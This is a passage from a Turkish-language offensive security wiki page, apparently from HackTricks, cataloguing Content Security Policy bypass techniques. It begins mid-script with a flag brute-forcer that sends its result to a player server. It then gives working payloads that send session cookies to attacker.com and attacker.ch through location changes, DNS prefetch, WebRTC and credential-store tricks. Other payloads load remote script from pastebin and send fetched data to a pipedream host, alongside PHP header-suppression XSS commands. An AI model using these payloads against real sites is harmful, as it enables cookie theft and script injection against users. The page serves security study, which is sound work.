let alphabet = "_abcdefghijklmnopqrstuvwxyz0123456789".split("")
let postfix = "}"

async function run() {
let prefix = "nn9ed{"
while (true) {
let i = 0
for (i; i < alphabet.length; i++) {
let c = alphabet[i]
let t = await query(prefix + c) // Check what chars returns TRUE or FALSE
console.log(prefix, c, t)
if (t) {
console.log("FOUND!")
prefix += c
break
}
}
if (i == alphabet.length) {
console.log("missing chars")
break
}
let t = await query(prefix + "}", true)
if (t) {
prefix += "}"
break
}
}
new Image().src = "http://PLAYER_SERVER/?" + prefix //Exfiltrate the flag
console.log(prefix)
}

run()
</script>
```
### Bookmarklets ile

Bu saldırı, saldırganın kullanıcıyı tarayıcıdaki bookmarklet'in üzerine bir link sürükleyip bırakmaya ikna ettiği bir social engineering senaryosunu gerektirir. Bu bookmarklet, drag\&dropped edildiğinde veya tıklandığında mevcut web penceresinin bağlamında çalıştırılacak **malicious javascript** kodu içerir; bu da **CSP'yi atlayarak cookies veya tokens gibi hassas bilgileri çalmaya izin verir**.

Daha fazla bilgi için [**orijinal rapora buradan bakın**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP bypass — CSP'yi kısıtlayarak

Bu [**CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution) içinde, CSP, izin verilen bir iframe içine daha kısıtlayıcı bir CSP enjekte edilerek atlatılmıştır; bu kısıtlayıcı CSP belirli bir JS dosyasının yüklenmesine izin vermiyordu ve daha sonra bu durum aracılığıyla **prototype pollution** veya **dom clobbering** ile farklı bir script'in kötüye kullanılarak rastgele bir script yüklemesine olanak sağlanmıştır.

Bir Iframe'in CSP'sini **`csp`** attribute'u ile kısıtlayabilirsiniz:
```html
<iframe
src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]"
csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
In [**this CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48), **HTML injection** yoluyla bir **CSP** daha sıkı kısıtlanabildi; böylece CSTI'yi engelleyen bir script devre dışı kaldı ve bu nedenle **vulnerability became exploitable.**\
CSP, **HTML meta tags** kullanılarak daha kısıtlayıcı hale getirilebilir ve inline script'ler, onların **nonce**'unu sağlayan **entry**'nin **removing** ile kaldırılmasıyla devre dışı bırakılabilir ve belirli inline script'ler **enable specific inline script via sha** ile etkinleştirilebilir:
```html
<meta
http-equiv="Content-Security-Policy"
content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';" />
```
### JS exfiltration with Content-Security-Policy-Report-Only

Eğer sunucunun başlık olarak **`Content-Security-Policy-Report-Only`** döndürmesini sağlayabilirseniz ve başlıktaki **değeri sizin kontrolünüzde** ise (örneğin bir CRLF yüzünden), bunu kendi sunucunuza yönlendirebilirsiniz. Exfiltrate etmek istediğiniz JS içeriğini **`<script>`** ile sararsanız ve `unsafe-inline` muhtemelen CSP tarafından izin verilmediği için, bu bir CSP hatası tetikleyecek ve script'in (hassas bilgiyi içeren kısmı) bir bölümü `Content-Security-Policy-Report-Only` üzerinden sunucuya gönderilecektir.

Bir örnek için [**check this CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector("DIV").innerHTML =
'<iframe src=\'javascript:var s = document.createElement("script");s.src = "https://pastebin.com/raw/dw5cWGK6";document.body.appendChild(s);\'></iframe>'
```
### Leaking Bilgi: CSP ve Iframe ile

- Bir `iframe` oluşturulur ve CSP tarafından izin verilen bir URL'ye (örneğin `https://example.redirect.com`) işaret eder.
- Bu URL daha sonra CSP tarafından **izin verilmeyen** gizli bir URL'ye (ör. `https://usersecret.example2.com`) yönlendirir.
- `securitypolicyviolation` event'ını dinleyerek `blockedURI` özelliği yakalanabilir. Bu özellik, engellenen URI'nın domainini ortaya çıkarır ve başlangıç URL'sinin yönlendirildiği gizli domaini sızdırır.

Chrome ve Firefox gibi tarayıcıların, CSP ile ilgili olarak iframe'leri farklı şekillerde işlemeleri ilginçtir; bu, tanımsız davranışlar nedeniyle hassas bilgilerin sızmasına yol açabilir.

Başka bir teknik, gizli alt alan adını çıkarmak için CSP'nin kendisinden faydalanmayı içerir. Bu yöntem, ikili arama algoritmasına dayanır ve belirli domainlerin kasıtlı olarak engellenmesi için CSP'nin ayarlanmasını gerektirir. Örneğin, gizli alt alan adı bilinmeyen karakterlerden oluşuyorsa, CSP direktifini değiştirerek bu alt alan adlarını engelleyip izin vererek adım adım farklı alt alan adlarını test edebilirsiniz. İşte bu yöntemi kolaylaştırmak için CSP'nin nasıl yapılandırılabileceğini gösteren bir snippet:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
CSP tarafından engellenen veya izin verilen istekleri izleyerek, gizli alt alan adındaki olası karakterleri daraltmak ve sonunda tam URL'yi ortaya çıkarmak mümkün.

Her iki yöntem de CSP uygulamasının ve tarayıcı davranışlarının nüanslarını istismar ederek, görünüşte güvenli politikaların kazara hassas bilgileri leak edebileceğini gösterir.

Hile şu kaynaktan: [**here**](https://ctftime.org/writeup/29310).

## CSP Bypass İçin Güvensiz Teknolojiler

### PHP Errors when too many params

Video içindeki [**last technique commented in this video**](https://www.youtube.com/watch?v=Sm4G6cAHjWM) kısmında belirtildiği üzere, çok fazla parametre göndermek (1001 GET parametresi; ayrıca POST params ile ve 20'den fazla dosyayla da yapılabilir). Bunun tetikleyeceği hata nedeniyle PHP web kodundaki tanımlı herhangi bir **`header()`** **gönderilmeyecektir**.

### PHP response buffer overload

PHP'nin varsayılan olarak yanıtı **4096 byte'a kadar tamponladığı** bilinir. Bu nedenle, PHP bir uyarı gösteriyorsa, uyarılar içinde **yeterli veri** sağlayarak, **yanıt** **CSP header**'dan **önce** **gönderilecek**, bu da header'ın yok sayılmasına sebep olacaktır.\

Böylece teknik temelde **yanıt tamponunu uyarılarla doldurmaktan** ibarettir, böylece CSP header gönderilmez.

Fikir [**this writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points)'dan.

### Kill CSP via max_input_vars (headers already sent)

Çünkü headers herhangi bir çıktıdan önce gönderilmek zorundadır, PHP tarafından üretilen uyarılar daha sonraki `header()` çağrılarını geçersiz kılabilir. Eğer kullanıcı girdisi `max_input_vars`'ı aşarsa, PHP önce bir startup uyarısı fırlatır; sonrasında yapılan `header('Content-Security-Policy: ...')` çağrısı “headers already sent” hatasıyla başarısız olur, bu da CSP'yi etkili bir şekilde devre dışı bırakır ve aksi takdirde engellenmiş reflective XSS'e izin verir.
```php
<?php
header("Content-Security-Policy: default-src 'none';");
echo $_GET['xss'];
```
Örnek:
```bash
# CSP in place → payload blocked by browser
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>"

# Exceed max_input_vars to force warnings before header() → CSP stripped
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>&A=1&A=2&...&A=1000"
# Warning: PHP Request Startup: Input variables exceeded 1000 ...
# Warning: Cannot modify header information - headers already sent
```
### Hata Sayfasını Yeniden Yazma

Bu [**yazıda**](https://blog.ssrf.kr/69) görünüşe göre bir hata sayfasını (muhtemelen CSP olmadan) yükleyip içeriğini yeniden yazarak CSP korumasını aşmanın mümkün olduğu belirtiliyor.
```javascript
a = window.open("/" + "x".repeat(4100))
setTimeout(function () {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`
}, 1000)
```
### SOME + 'self' + wordpress

SOME, bir XSS (veya oldukça kısıtlı bir XSS) istismar ederek bir sayfanın **bir endpoint'inde** bulunan zayıflığı kullanıp aynı origin'deki **diğer endpoint'leri istismar etmek** için kullanılan bir tekniktir. Bu, zayıf endpoint'i bir saldırgan sayfasından yükleyip ardından saldırgan sayfasını istismar etmek istediğiniz aynı origin'deki gerçek endpoint'e yenileyerek yapılır. Bu şekilde **zayıf endpoint** yükteki `opener` nesnesini kullanarak **payload** içindeki verilerle istismar edilecek **gerçek endpoint**in **DOM**'una **erişebilir**. Daha fazla bilgi için bakın:

{{#ref}}
../xss-cross-site-scripting/some-same-origin-method-execution.md
{{#endref}}

Ayrıca, **wordpress**'in `/wp-json/wp/v2/users/1?_jsonp=data` içinde bir **JSONP** endpoint'i vardır; bu endpoint gönderilen **data**'yı çıktıda **yansıtır** (sadece harf, rakam ve nokta ile sınırlıdır).

Bir saldırgan bu endpoint'i WordPress'e karşı **SOME attack** **generate** etmek ve bunu `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` içine **embed** etmek için kötüye kullanabilir; bu **script** **yüklenecektir** çünkü `'self'` tarafından **izin verilmiştir**. Üstelik, WordPress kurulu olduğu için bir saldırgan **SOME attack**'ı **vulnerable** **callback** endpoint'i aracılığıyla kullanarak **CSP'yi bypass eden** bir yol elde edebilir; böylece bir kullanıcıya daha fazla ayrıcalık verebilir, yeni bir plugin yükleyebilir...\
Bu saldırının nasıl gerçekleştirileceği hakkında daha fazla bilgi için bakın [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Veri Sızdırma Bypass'ları

Eğer harici sunucularla **etkileşimde bulunmanıza** izin vermeyen sıkı bir CSP varsa, bilgileri sızdırmak için her zaman yapabileceğiniz bazı yöntemler vardır.

### Location

Gizli bilgiyi saldırganın sunucusuna göndermek için sadece location'u güncelleyebilirsiniz:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
document.location = "https://attacker.com/?" + sessionid
```
### Meta tag

Bir meta tag enjekte ederek redirect edebilirsiniz (bu sadece bir redirect, içerik leak olmaz)
```html
<meta http-equiv="refresh" content="1; http://attacker.com" />
```
### DNS Prefetch

Sayfaları daha hızlı yüklemek için, tarayıcılar host adlarını IP adreslerine önceden çözer ve daha sonra kullanım için önbelleğe alır.\
Bir tarayıcıya bir host adını önceden çözmesini şu etiketle belirtebilirsiniz: `<link rel="dns-prefetch" href="something.com">`

Bu davranışı DNS istekleri yoluyla **hassas bilgileri sızdırmak** için kötüye kullanabilirsiniz:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
var body = document.getElementsByTagName("body")[0]
body.innerHTML =
body.innerHTML +
'<link rel="dns-prefetch" href="//' +
sessionid +
'attacker.ch">'
```
Başka bir yol:
```javascript
const linkEl = document.createElement("link")
linkEl.rel = "prefetch"
linkEl.href = urlWithYourPreciousData
document.head.appendChild(linkEl)
```
Bunun olmasını önlemek için sunucu şu HTTP başlığını gönderebilir:
```
X-DNS-Prefetch-Control: off
```
> [!TIP]
> Görünüşe göre bu teknik headless browsers (bots) üzerinde çalışmıyor

### WebRTC

Bazı sayfalarda **WebRTC'nin CSP'deki `connect-src` politikasını kontrol etmediğini** okuyabilirsiniz.

Aslında bir _leak_ elde edebilirsiniz _DNS request_ kullanarak. Koda göz atın:
```javascript
;(async () => {
p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] })
p.createDataChannel("")
p.setLocalDescription(await p.createOffer())
})()
```
Başka bir seçenek:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
### CredentialsContainer

Kimlik bilgileri açılır penceresi, sayfa tarafından kısıtlanmadan iconURL'ye bir DNS isteği gönderir. Yalnızca güvenli bir bağlamda (HTTPS) veya localhost'ta çalışır.
```javascript
navigator.credentials.store(
new FederatedCredential({
id:"satoki",
name:"satoki",
provider:"https:"+your_data+"example.com",
iconURL:"https:"+your_data+"example.com"
})
)
```
## CSP Politikalarını Çevrimiçi Kontrol Etme

- [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
- [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## CSP'yi Otomatik Olarak Oluşturma

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Kaynaklar

- [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
- [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
- [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
- [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
- [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
- [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
- [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)
- [https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket](https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

​

{{#include ../../banners/hacktricks-training.md}}
